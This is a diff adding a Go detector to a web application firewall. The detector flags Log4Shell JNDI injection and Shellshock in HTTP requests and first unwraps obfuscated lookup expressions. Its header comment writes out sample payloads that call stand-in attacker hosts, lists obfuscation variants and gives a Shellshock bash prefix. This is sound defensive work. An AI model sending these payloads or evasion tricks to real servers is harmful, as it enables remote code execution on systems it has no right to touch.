@@ -1,0 +1,188 @@
+package semantic
+
+import (
+	"regexp"
+	"strings"
+
+	"github.com/LaokeQwQ/CheeseWAF/internal/engine"
+	"github.com/LaokeQwQ/CheeseWAF/internal/engine/decoder"
+)
+
+// Log4ShellDetector detects Log4Shell (CVE-2021-44228) JNDI injection patterns.
+//
+// Core signatures:
+//   - ${jndi:ldap://attacker.com/exploit}
+//   - ${jndi:rmi://evil.host/obj}
+//   - ${jndi:dns://callback.domain}
+//   - Obfuscated variants: ${${::-j}ndi:ldap://...} / ${jndi:${lower:l}dap://...}
+//   - Nested lookups: ${${env:ENV_VAR:-j}ndi:ldap://...}
+//
+// Also covers Shellshock (CVE-2014-6271): () { :;}; /bin/bash -c "..."
+func log4ShellSurfaces(reqCtx *engine.RequestContext) []string {
+	surfaces := []string{requestText(reqCtx)}
+	if reqCtx == nil || reqCtx.Request == nil || reqCtx.Request.URL == nil {
+		return surfaces
+	}
+	for _, values := range reqCtx.Request.URL.Query() {
+		for _, value := range values {
+			if value == "" {
+				continue
+			}
+			surfaces = append(surfaces, value, decoder.Decode(value).Text)
+		}
+	}
+	for index := range surfaces {
+		if decoded := decoder.Decode(surfaces[index]).Text; decoded != surfaces[index] {
+			surfaces = append(surfaces, decoded)
+		}
+	}
+	return surfaces
+}
+
+// analyzeLog4Shell is the semantic analyzer entry point called from analyzer.go.
+func analyzeLog4Shell(candidate semanticCandidate) (Hit, bool) {
+	normalized := normalizeLog4Shell(candidate.text)
+
+	// Log4Shell JNDI injection
+	if rxLog4ShellJNDI.MatchString(normalized) {
+		return hit(candidate, "log4shell", engine.SeverityCritical, 0.98, map[string]bool{
+			"syntax: Log4j JNDI lookup expression":                                         true,
+			"semantics: remote naming service lookup can load attacker-controlled content": true,
+		}), true
+	}
+
+	// Obfuscated Log4Shell
+	if rxLog4ShellObfuscated.MatchString(normalized) {
+		return hit(candidate, "log4shell", engine.SeverityCritical, 0.96, map[string]bool{
+			"syntax: obfuscated Log4j lookup expression":                                   true,
+			"semantics: remote naming service lookup can load attacker-controlled content": true,
+		}), true
+	}
+
+	// Shellshock
+	if rxShellshock.MatchString(normalized) {
+		return hit(candidate, "shellshock", engine.SeverityCritical, 0.97, map[string]bool{
+			"syntax: Shellshock function-definition prefix":        true,
+			"semantics: trailing shell command execution boundary": true,
+		}), true
+	}
+
+	return Hit{}, false
+}
+
+var (
+	// Log4Shell JNDI injection: ${jndi:ldap://...} / ${jndi:rmi://...} / ${jndi:dns://...}
+	rxLog4ShellJNDI = regexp.MustCompile(`\$\{jndi:(?:ldap|rmi|dns|iiop|corba|nds)://`)
+	// Obfuscated variants that survive peel (single ${...} still carrying jndi/ldap and ://).
+	rxLog4ShellObfuscated = regexp.MustCompile(`\$\{[^}]*(?:jndi|ldap|rmi|dns)[^}]*://`)
+	// Innermost ${...} with no nested brace; peelLog4jLookups walks these outward.
+	rxLog4jInnermostLookup = regexp.MustCompile(`\$\{([^{}]+)\}`)
+	// Shellshock: () { :;}; <command>
+	rxShellshock = regexp.MustCompile(`\(\s*\)\s*\{\s*:;\s*\};`)
+)
+
+// normalizeLog4Shell expands character-substitution lookups, then lowercases so
+// ${upper:j}ndi and ${::-J}ndi still match the canonical JNDI regex.
+func normalizeLog4Shell(text string) string {
+	return strings.ToLower(peelLog4jLookups(text))
+}
+
+// hasLog4ShellLookup reports a JNDI lookup either in the clear or after peel.
+// Used by hint/guess so obfuscated ${${::-j}ndi:...} still reaches analyzeLog4Shell.
+func hasLog4ShellLookup(normalized string) bool {
+	if log4ShellJNDIToken(normalized) {
+		return true
+	}
+	if !strings.Contains(normalized, "${") {
+		return false
+	}
+	if !strings.Contains(normalized, "::-") &&
+		!strings.Contains(normalized, "lower:") &&
+		!strings.Contains(normalized, "upper:") &&
+		!strings.Contains(normalized, ":-") &&
+		!strings.Contains(normalized, "${date:") {
+		return false
+	}
+	return log4ShellJNDIToken(normalizeLog4Shell(normalized))
+}
+
+func log4ShellJNDIToken(s string) bool {
+	return strings.Contains(s, "${jndi:") ||
+		strings.Contains(s, "jndi:ldap://") ||
+		strings.Contains(s, "jndi:rmi://") ||
+		strings.Contains(s, "jndi:dns://") ||
+		strings.Contains(s, "jndi:iiop://") ||
+		strings.Contains(s, "jndi:corba://") ||
+		strings.Contains(s, "jndi:nds://")
+}
+
+// peelLog4jLookups expands character-substitution lookups so a later JNDI match
+// sees ${jndi:ldap://...}. ${::-j}, ${:-j}, ${lower:j}, ${date:'j'}, and any
+// ${name:-j} default become that value. Lookups without a default, including
+// ${sys:java.version} used as a callback host, stay intact. ${jndi:...} itself
+// is not expanded.
+func peelLog4jLookups(s string) string {
+	const maxRounds = 12
+	for i := 0; i < maxRounds; i++ {
+		next := rxLog4jInnermostLookup.ReplaceAllStringFunc(s, expandLog4jLookup)
+		if next == s {
+			return s
+		}
+		s = next
+	}
+	return s
+}
+
+func expandLog4jLookup(match string) string {
+	if len(match) < 3 {
+		return match
+	}
+	inner := match[2 : len(match)-1]
+	if strings.HasPrefix(inner, "::-") {
+		return inner[3:]
+	}
+	// ${:-j} is the empty-name default form; colon sits at index 0.
+	if strings.HasPrefix(inner, ":-") {
+		return inner[2:]
+	}
+	lowerInner := strings.ToLower(inner)
+	if strings.HasPrefix(lowerInner, "date:") {
+		rest := inner[len("date:"):]
+		if rest == "" {
+			return ""
+		}
+		if len(rest) >= 2 {
+			q := rest[0]
+			if (q == '\'' || q == '"') && rest[len(rest)-1] == q {
+				return rest[1 : len(rest)-1]
+			}
+		}
+	}
+	colon := strings.IndexByte(inner, ':')
+	if colon <= 0 {
+		return match
+	}
+	prefix := strings.ToLower(inner[:colon])
+	if prefix == "jndi" {
+		return match
+	}
+	// Defaults before case-fold: ${lower:-j} is lookup "lower" with default "j".
+	if i := strings.LastIndex(inner, ":-"); i >= 0 {
+		return inner[i+2:]
+	}
+	rest := inner[colon+1:]
+	switch prefix {
+	case "lower", "lowercase":
+		return strings.ToLower(rest)
+	case "upper", "uppercase":
+		return strings.ToUpper(rest)
+	}
+	return match
+}
+
+func truncateLog4Shell(s string, max int) string {
+	if len(s) <= max {
+		return s
+	}
+	return s[:max] + "..."
+}
